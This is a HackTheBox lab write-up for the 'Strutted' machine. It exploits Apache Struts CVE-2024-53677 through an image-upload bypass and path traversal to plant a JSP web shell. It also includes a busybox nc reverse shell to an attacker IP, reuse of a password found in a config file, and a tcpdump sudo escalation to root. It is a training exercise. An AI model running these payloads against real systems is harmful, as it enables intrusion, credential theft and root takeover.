---
layout: post
title: "HTB Strutted Writeup"
date: 2025-09-08 18:50:41 -0400
categories: hackthebox HTB-medium
tags: hacking CTF HTB HTB-medium upload-bypass GTFO-bin
---
## Introduction
This is a medium Linux machine on [HackTheBox](https://app.hackthebox.com/machines/Strutted){:target="_blank"}{:rel="noopener noreferrer"}

![htb-strutted-pwn](images/HTB-strutted/htb-strutted-pwn.png)

## Enumeration
### Port Scan
Let's find out what services are accessible 
```bash
rustscan -a <MACHINE-IP> -- -A -sC
```

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Because guessing isn't hacking.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.59:22
Open 10.10.11.59:80
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

### Website

The homepage lets us upload image files through the endpoint

```
http://strutted.htb/upload.action
```

We can download the source of the website at

```
http://strutted.htb/download.action
```

### Source Analysis

The upload feature validates data through the `Content-Type`, `magic bytes`, and the `file extension`. We can read this in `strutted/src/main/java/org/strutted/htb/Upload.java`

Through the `Content-Type` validation we can only upload `jpeg`, `png`, and `gif` files.

```java
    private boolean isAllowedContentType(String contentType) {
        String[] allowedTypes = {"image/jpeg", "image/png", "image/gif"};
        for (String allowedType : allowedTypes) {
            if (allowedType.equalsIgnoreCase(contentType)) {
                return true;
            }
        }
        return false;
    }
```

Comparing the magic bytes. `GIF` seems straight forward to imitate

```java
private boolean isImageByMagicBytes(File file) {
	byte[] header = new byte[8];
	try (InputStream in = new FileInputStream(file)) {
		int bytesRead = in.read(header, 0, 8);
		if (bytesRead < 8) {
			return false;
		}

		// JPEG
		if (header[0] == (byte)0xFF && header[1] == (byte)0xD8 && header[2] == (byte)0xFF) {
			return true;
		}

		// PNG
		if (header[0] == (byte)0x89 && header[1] == (byte)0x50 && header[2] == (byte)0x4E && header[3] == (byte)0x47) {
			return true;
		}

		// GIF (GIF87a or GIF89a)
		if (header[0] == (byte)0x47 && header[1] == (byte)0x49 && header[2] == (byte)0x46 &&
			header[3] == (byte)0x38 && (header[4] == (byte)0x37 || header[4] == (byte)0x39) && header[5] == (byte)0x61) {
			return true;
		}
// snip
}
```

Reading the `pom.xml` file in the root directory, we can find some version information

```xml
<!-- snip !-->
<properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <struts2.version>6.3.0.1</struts2.version>
        <jetty-plugin.version>9.4.46.v20220331</jetty-plugin.version>
        <maven.javadoc.skip>true</maven.javadoc.skip>
        <jackson.version>2.14.1</jackson.version>
        <jackson-data-bind.version>2.14.1</jackson-data-bind.version>
    </properties>
<!-- snip !-->
```

## Initial Foothold

This version of apache strut is vulnerable to [CVE-2024-53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677){:target="_blank"}{:rel="noopener noreferrer"}. We can achieve **remote code execution** and **path traversal** by manipulating the upload parameters.

Let's trigger this exploit manually! Here's a more [detailed explanation](https://www.dynatrace.com/news/blog/the-anatomy-of-broken-apache-struts-2-a-technical-deep-dive-into-cve-2024-53677/){:target="_blank"}{:rel="noopener noreferrer"} of the vulnerability.

When a file is uploaded (after the initial checks are bypassed), we can use variables **specific to apache strut** to change the **file extension and location** of our uploaded file. So if we upload a `gif` file, we can use these vulnerable parameters to change it to a `php` file, and place it in an easily accessible (and executable) location to achieve **remote code execution!**

### Upload Bypass
Our goal is to upload [this jsp web shell](https://github.com/TAM-K592/CVE-2024-53677-S2-067/blob/ALOK/shell.jsp){:target="_blank"}{:rel="noopener noreferrer"} on the server to run commands. In order for our exploit to work, we'll need to bypass the upload restrictions. 

Bypassing the file extension is easy enough, just rename the file

```bash
mv shell.jsp shell.gif
```

To pass the magic bytes check, we'll need to add the `gif` bytes at the beginning. Just add this `gif` string at the start of the file

```bash
GIF87a
<%@ page import="java.io.*, java.util.*, java.net.*" %>
# rest of shell.jsp source here
```

Finally we just need to change the `Content-Type` form header to reflect **any valid file type** when we send send the `POST` request

```bash
# it doesn't have to be a gif!
Content-Type: image/png
```

### Remote Code Execution
Now we can upload the web shell with `curl`. Notice the capitalization in `Upload` and `UploadFileName`! These are the special (vulnerable) parameters that we're going to exploit

```bash
curl -X POST http://strutted.htb/upload.action -F 'Upload=@./shell.gif' -F 'top.UploadFileName=../../shell.jsp'
```

When successful, the uploaded file location will be embedded in the response

```js
<img src="uploads/20250828_163037/../../shell.jsp" alt="Uploaded File"/>
```

Here is the payload sent through burp

```
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------34232648183382128405422289677
Content-Length: 3156
Origin: http://strutted.htb
Connection: keep-alive
Referer: http://strutted.htb/upload.action
Cookie: JSESSIONID=267C77DCD2517780429353BB566B43C8
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

-----------------------------34232648183382128405422289677
Content-Disposition: form-data; name="Upload"; filename="shell.gif";
Content-Type: image/png

GIF87a
// jsp webshell here
-----------------------------34232648183382128405422289677
Content-Disposition: form-data; name="top.UploadFileName"

../../shell.jsp
-----------------------------34232648183382128405422289677--
```

Now we can run commands so I sent a URL encoded `busybox` reverse shell from [revshells](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}

```bash
busybox nc <ATTACKER-IP> 4444 -e /bin/bash
```

Triggering the reverse shell

```bash
nc -lvnp 4444 # listener on the attacking machine
```

```bash
curl 'http://strutted.htb/shell.jsp?action=cmd&cmd=busybox%20nc%2010.10.14.186%204444%20-e%20%2Fbin%2Fbash'
```

We can stabilize and upgrade the shell using `python3`

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl + z
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```

## user.txt
Now that we're on the server let's look for credentials in the configuration files

```bash
tomcat@strutted:~/conf$ cat tomcat-users.xml  |  grep 'password'
  you must define such a user - the username and password are arbitrary.
  will also need to set the passwords to something appropriate.
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
  <user username="admin" password="<PASSWORD>" roles="manager-gui,admin-gui"/>
  them. You will also need to set the passwords to something appropriate.
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
```

Through **password reuse** we can use `admin`'s password for `james`. We can't `su` as `james` from `tomcat` but **we can** `ssh` in

```bash
ssh james@strutted.htb
```

![htb-strutted-user-txt](images/HTB-strutted/htb-strutted-user-txt.png)
## root.txt
Enumerating the privileges of our new user

```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

`tcpdump` has an entry on [GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/#sudo){:target="_blank"}{:rel="noopener noreferrer"} we can follow

In this case we'll create a copy of `/bin/bash` with the `suid` bit set

```bash
COMMAND='id'
TF=$(mktemp)
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash;" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

![htb-strutted-root-txt](images/HTB-strutted/htb-strutted-root-txt.png)
## Recap
The website's homepage lets us upload an image file and download the source code of the site. Reading the source, we find that it is running a vulnerable version of [Apache Struts](https://struts.apache.org/){:target="_blank"}{:rel="noopener noreferrer"}. Using [CVE-2024-53677](https://nvd.nist.gov/vuln/detail/CVE-2024-53677){:target="_blank"}{:rel="noopener noreferrer"} and bypassing the image upload restrictions, the attacker can **upload arbitrary files to any location**. Uploading a `jsp` web shell gives a foothold into the system

Reading configuration files on the server reveals a password that is **reused** by the user. While the `tomcat` user can't `su`, we can still `ssh` in.

The user can run `tcpdump` with `sudo`. Leveraging its corresponding [GTFO-bin](https://gtfobins.github.io/gtfobins/tcpdump/){:target="_blank"}{:rel="noopener noreferrer"} entry, we can create a `root` shell.

